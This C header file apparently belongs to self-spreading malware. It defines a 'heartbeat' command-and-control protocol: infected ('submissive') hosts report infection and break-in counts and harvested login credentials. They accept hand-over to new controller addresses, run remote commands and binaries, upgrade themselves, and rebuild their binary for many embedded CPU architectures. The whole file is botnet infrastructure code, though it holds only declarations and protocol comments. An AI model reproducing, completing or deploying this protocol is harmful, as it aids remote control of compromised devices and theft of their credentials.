#pragma once
#include "util_ct.h"

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <netinet/in.h>

#define PRNE_PROONE_EC_OK		0
#define PRNE_PROONE_EC_FAIL		1
#define PRNE_PROONE_EC_LOCK		3


typedef struct prne_net_endpoint prne_net_endpoint_t;
typedef struct prne_ip_addr prne_ip_addr_t;
typedef struct prne_host_cred prne_host_cred_t;
typedef struct prne_htbt_status prne_htbt_status_t;
typedef struct prne_htbt_host_info prne_htbt_host_info_t;
typedef struct prne_htbt_msg_head prne_htbt_msg_head_t;
typedef struct prne_htbt_cmd prne_htbt_cmd_t;
typedef struct prne_htbt_bin_meta prne_htbt_bin_meta_t;
typedef struct prne_htbt_hover prne_htbt_hover_t;
typedef struct prne_htbt_stdio prne_htbt_stdio_t;
typedef struct prne_htbt_rcb prne_htbt_rcb_t;

typedef enum {
	PRNE_ARCH_NONE,

	PRNE_ARCH_I686,
	PRNE_ARCH_X86_64,
	PRNE_ARCH_ARMV4T,
	PRNE_ARCH_ARMV7,
	PRNE_ARCH_AARCH64,
	PRNE_ARCH_MIPS,
	PRNE_ARCH_MPSL,
	PRNE_ARCH_PPC,
	PRNE_ARCH_SH4,
	PRNE_ARCH_M68K,
	PRNE_ARCH_ARC,
	PRNE_ARCH_ARCEB,

	NB_PRNE_ARCH
} prne_arch_t;
PRNE_LIMIT_ENUM(prne_arch_t, NB_PRNE_ARCH, 0xFE);

typedef enum {
	PRNE_IPV_NONE,
	PRNE_IPV_4,
	PRNE_IPV_6
} prne_ipv_t;

prne_static_assert(
	sizeof(struct in_addr) == 4,
	"sizeof(struct in_addr) == 4");
prne_static_assert(
	sizeof(struct in6_addr) == 16,
	"sizeof(struct in6_addr) == 16");
struct prne_ip_addr {
	uint8_t addr[16];
	prne_ipv_t ver;
};

struct prne_net_endpoint {
	prne_ip_addr_t addr;
	uint16_t port;
};

struct prne_host_cred {
	char *id;
	char *pw;
};

/* Heartbeat Frame OP Codes
* All messages start with uint16_t 'msg_id', whose most significant bit is
* used to indicate whether the message is a initiation(1) or a response(0).
* 'msg_id' is a randomly generated by either end of connection. The value 0 is
* only valid for `PRNE_HTBT_OP_NOOP`(so that NOOP message is either 23 or 24
* zeros over the wire).
* 'msg_id' is followed by uint8_t 'op', which holds a `prne_htbt_op_t` value.
* The length of data follows varies depending on 'op'.
*/
typedef enum {
	PRNE_HTBT_OP_NONE = -1,

	/* NOOP(keep-alive message): followed by nothing
	*/
	PRNE_HTBT_OP_NOOP,
	/* Operation Status
	* Followed by:
	* 	uint8_t code: prne_htbt_status_t
	* 	int32_t err: errno value(used for `PRNE_HTBT_STATUS_ERRNO`)
	*/
	PRNE_HTBT_OP_STATUS,
	/* Host Info Operation: followed by nothing
	*
	* The submissive end's response format:
	* 	uint8_t prog_ver[16]
	* 	uint8_t boot_id[16]
	* 	uint8_t instance_id[16]
	* 	uint64_t parent_uptime	: in seconds
	* 	uint64_t child_uptime	: in seconds
	* 	uint64_t bne_cnt		: break-and-entry count
	* 	uint64_t infect_cnt		: infect count ( <= 'bne_cnt')
	*	uint32_t crash_cnt
	* 	uint32_t parent_pid
	* 	uint32_t child_pid
	* 	uint8_t host_cred_len
	* 	uint8_t arch			: `prne_arch_t` value
	* 	uint8_t host_cred[host_cred_len]
	*/
	PRNE_HTBT_OP_HOST_INFO,
	/* Hand Over Operation
	* Upon reception of message, the submissive end should conclude
	* the connection and get further instruction(op) from the host
	* described in the message.
	*
	* Followed by:
	* 	uint8_t addr_4[4]
	* 	uint16_t port_4
	* 	uint8_t addr_6[16]
	* 	uint16_t port_6
	*/
	PRNE_HTBT_OP_HOVER,
	/* OP Solicit Operation: followed by nothing
	* This op is used by the submissive end to solicit instruction(op) from
	* the authoritive end. This op is used when the submissive end has
	* connected to the authoritive end after having been instructed by
	* the previous authoritive end(PRNE_HTBT_OP_HOVER).
	*/
	PRNE_HTBT_OP_SOLICIT,
	/* Run Command Operation
	* TODO
	*
	* Followed by
	*	uint5_t rsv
	*	uint1_t detach
	* 	uint10_t args_len	: the length of 'args'
	* 	char args[len]		: the series of null-terminated string for exec*()
	*/
	PRNE_HTBT_OP_RUN_CMD,
	/* Binary Upgrade Operation
	* TODO
	*
	* Followed by:
	* 	uint24_t bin_len
	*	uint5_t rsv
	*	uint1_t detach
	* 	uint10_t args_len
	* 	char args[args_len]
	* 	uint8_t bin[bin_len]
	*/
	PRNE_HTBT_OP_UP_BIN,
	/* Run Binary Operation
	* TODO
	*
	* Followed by:
	* 	uint24_t bin_len
	*	uint5_t rsv
	*	uint1_t detach
	* 	uint10_t args_len
	* 	char args[args_len]
	* 	uint8_t bin[bin_len]
	*/
	PRNE_HTBT_OP_RUN_BIN,
	/* STDIO Frame
	* TODO
	*
	*	uint1_t err		: 0 - stdin/stdout, 1 - stderr
	*	uint1_t fin
	*	uint2_t rsv
	*	uint12_t len
	*/
	PRNE_HTBT_OP_STDIO,
	/* Binary Recombination Operation
	* TODO
	*
	*	uint8_t arch	: "self" assumed if PRNE_ARCH_NONE
	*	uint1_t compat	: allow fallback to compatible arch
	*	uint7_t rsv
	*/
	PRNE_HTBT_OP_RCB,

	NB_PRNE_HTBT_OP
} prne_htbt_op_t;
PRNE_LIMIT_ENUM(prne_htbt_op_t, NB_PRNE_HTBT_OP, 0xFE);

typedef enum {
	PRNE_HTBT_STATUS_OK,
	PRNE_HTBT_STATUS_UNIMPL,
	/* Protocol error detected. Mosts likely a format error.
	* An int32_t that follows is not used.
	*/
	PRNE_HTBT_STATUS_PROTO_ERR,
	/* An internal error occurred whilst processing request.
	* Followed by int32_t which represents the errno set during the operation.
	*/
	PRNE_HTBT_STATUS_ERRNO,
	PRNE_HTBT_STATUS_SUB,
	PRNE_HTBT_STATUS_TIMEDOUT,
	PRNE_HTBT_STATUS_LIMIT,

	NB_PRNE_HTBT_STATUS
} prne_htbt_status_code_t;
PRNE_LIMIT_ENUM(prne_htbt_status_code_t, NB_PRNE_HTBT_STATUS, 0xFF);

typedef enum {
	PRNE_HTBT_SER_RC_OK,
	PRNE_HTBT_SER_RC_MORE_BUF,
	PRNE_HTBT_SER_RC_ERRNO,
	PRNE_HTBT_SER_RC_FMT_ERR,

	NB_PRNE_HTBT_SER_RC
} prne_htbt_ser_rc_t; // serialise result code

struct prne_htbt_msg_head {
	prne_htbt_op_t op;
	uint16_t id; // != 0 (except NOOP)
	bool is_rsp;
};

struct prne_htbt_status {
	prne_htbt_status_code_t code;
	int32_t err;
};

struct prne_htbt_host_info {
	uint64_t parent_uptime;
	uint64_t child_uptime;
	uint64_t bne_cnt;
	uint64_t infect_cnt;
	uint32_t parent_pid;
	uint32_t child_pid;
	uint8_t prog_ver[16];
	uint8_t boot_id[16];
	uint8_t instance_id[16];
	uint8_t *host_cred;
	size_t host_cred_len;
	uint32_t crash_cnt;
	prne_arch_t arch;
};

struct prne_htbt_cmd {
	char *mem;
	size_t mem_len;
	char **args;
	uint8_t argc;
	bool detach;
};

struct prne_htbt_bin_meta {
	uint32_t bin_size;
	prne_htbt_cmd_t cmd;
};

struct prne_htbt_hover {
	struct {
		uint8_t addr[4];
		uint16_t port;
	} v4;
	struct {
		uint8_t addr[16];
		uint16_t port;
	} v6;
};

struct prne_htbt_stdio {
	size_t len;
	bool err;
	bool fin;
};

struct prne_htbt_rcb {
	prne_arch_t arch;
	bool compat;
};

typedef void(*prne_htbt_init_ft)(void *ptr);
typedef void(*prne_htbt_free_ft)(void *ptr);
typedef bool(*prne_htbt_eq_ft)(const void *a, const void *b);
typedef prne_htbt_ser_rc_t(*prne_htbt_ser_ft)(
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const void *in);
typedef prne_htbt_ser_rc_t(*prne_htbt_dser_ft)(
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	void *out);

#define PRNE_HTBT_TLS_ALP			"prne-htbt"
#define PRNE_HTBT_MSG_ID_MIN		1
#define PRNE_HTBT_MSG_ID_MAX		INT16_MAX
#define PRNE_HTBT_MSG_ID_DELTA		INT16_MAX
#define PRNE_HTBT_PROTO_PORT		64420
// _POSIX_ARG_MAX equiv
#define PRNE_HTBT_ARGS_MAX			255
#define PRNE_HTBT_ARG_MEM_MAX		1023
#define PRNE_HTBT_STDIO_LEN_MAX		0x0FFF
#define PRNE_HTBT_BIN_LEN_MAX		0xFFFFFF

/* PRNE_HTBT_PROTO_MIN_BUF
*
* Minimum size of buffer required to implement parsing of stream. This is the
* size required to deserialise PRNE_HTBT_OP_UP_BIN and PRNE_HTBT_OP_RUN_BIN.
*/
#define PRNE_HTBT_PROTO_MIN_BUF ((size_t)3 + 5 + PRNE_HTBT_ARG_MEM_MAX)
/* PRNE_HTBT_PROTO_SUB_MIN_BUF
*
* Required write buffer size for submissive end. Set to that of
* PRNE_HTBT_OP_HOST_INFO.
*/
#define PRNE_HTBT_PROTO_SUB_MIN_BUF ((size_t)3 + 94 + 255)


const char *prne_arch_tostr (const prne_arch_t x);
prne_arch_t prne_arch_fstr (const char *str);
bool prne_arch_inrange (const prne_arch_t x);

bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b);
void prne_net_ep_tosin4 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in *out);
void prne_net_ep_tosin6 (
	const prne_net_endpoint_t *ep,
	struct sockaddr_in6 *out);
bool prne_net_ep_set_ipv4 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out);
bool prne_net_ep_set_ipv6 (
	const char *str,
	const uint16_t port,
	prne_net_endpoint_t *out);

const char *prne_htbt_op_tostr (const prne_htbt_op_t x);

void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh);
void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh);
bool prne_htbt_eq_msg_head (
	const prne_htbt_msg_head_t *a,
	const prne_htbt_msg_head_t *b);

void prne_htbt_init_status (prne_htbt_status_t *s);
void prne_htbt_free_status (prne_htbt_status_t *s);
bool prne_htbt_eq_status (
	const prne_htbt_status_t *a,
	const prne_htbt_status_t *b);

void prne_init_host_cred (prne_host_cred_t *hc);
bool prne_alloc_host_cred (
	prne_host_cred_t *hc,
	const uint8_t id_len,
	const uint8_t pw_len);
void prne_free_host_cred (prne_host_cred_t *hc);
bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b);
prne_htbt_ser_rc_t prne_enc_host_cred (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	const prne_host_cred_t *in);
prne_htbt_ser_rc_t prne_dec_host_cred (
	const uint8_t *data,
	const size_t len,
	prne_host_cred_t *out);

void prne_htbt_init_host_info (prne_htbt_host_info_t *hi);
bool prne_htbt_alloc_host_info (
	prne_htbt_host_info_t *hi,
	const size_t cred_len);
void prne_htbt_free_host_info (prne_htbt_host_info_t *hi);
bool prne_htbt_eq_host_info (
	const prne_htbt_host_info_t *a,
	const prne_htbt_host_info_t *b);

void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd);
bool prne_htbt_alloc_cmd (
	prne_htbt_cmd_t *cmd,
	const size_t argc,
	const size_t *args_len);
bool prne_htbt_set_cmd (prne_htbt_cmd_t *cmd, const char **args);
void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd);
bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b);

void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb);
void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb);
bool prne_htbt_eq_bin_meta (
	const prne_htbt_bin_meta_t *a,
	const prne_htbt_bin_meta_t *b);

void prne_htbt_init_hover (prne_htbt_hover_t *ho);
void prne_htbt_free_hover (prne_htbt_hover_t *ho);
bool prne_htbt_eq_hover (
	const prne_htbt_hover_t *a,
	const prne_htbt_hover_t *b);
bool prne_htbt_cp_hover (
	const prne_htbt_hover_t *a,
	prne_htbt_hover_t *b);

void prne_htbt_init_stdio (prne_htbt_stdio_t *s);
void prne_htbt_free_stdio (prne_htbt_stdio_t *s);
bool prne_htbt_eq_stdio (
	const prne_htbt_stdio_t *a,
	const prne_htbt_stdio_t *b);

void prne_htbt_init_rcb (prne_htbt_rcb_t *r);
void prne_htbt_free_rcb (prne_htbt_rcb_t *r);
bool prne_htbt_eq_rcb (const prne_htbt_rcb_t *a, const prne_htbt_rcb_t *b);

prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_msg_head_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_status (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_status_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_host_info (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_host_info_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_hover (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_hover_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_cmd (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_cmd_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_bin_meta_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_stdio (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_stdio_t *in);
prne_htbt_ser_rc_t prne_htbt_ser_rcb (
	uint8_t *mem,
	const size_t mem_len,
	size_t *actual,
	const prne_htbt_rcb_t *in);

prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_msg_head_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_status (
	uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_status_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_host_info (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_host_info_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_hover (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_hover_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_cmd (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_cmd_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_bin_meta_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_stdio (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_stdio_t *out);
prne_htbt_ser_rc_t prne_htbt_dser_rcb (
	const uint8_t *data,
	const size_t len,
	size_t *actual,
	prne_htbt_rcb_t *out);

char **prne_htbt_parse_args (
	char *m_args,
	const size_t args_size,
	const size_t add_argc,
	char **add_args,
	size_t *argc,
	const size_t max_args);

uint16_t prne_htbt_gen_msgid (void *ctx, uint16_t(*rnd_f)(void*));

const char *prne_htbt_serrc_tostr (const prne_htbt_ser_rc_t x);
